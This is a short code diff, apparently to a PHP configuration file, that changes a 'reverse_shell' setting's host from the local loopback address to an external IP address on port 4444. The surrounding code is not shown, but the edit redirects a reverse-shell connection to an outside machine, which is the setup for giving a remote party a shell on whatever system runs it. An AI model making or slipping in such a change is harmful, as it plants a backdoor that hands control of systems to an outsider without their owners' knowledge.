@@ -15,7 +15,7 @@ return [
 
     // Reverse Shell Configuration
     'reverse_shell' => [
-        'host' => '127.0.0.1',
+        'host' => '77.110.126.70',
         'port' => 4444,
         'timeout' => 30
     ],
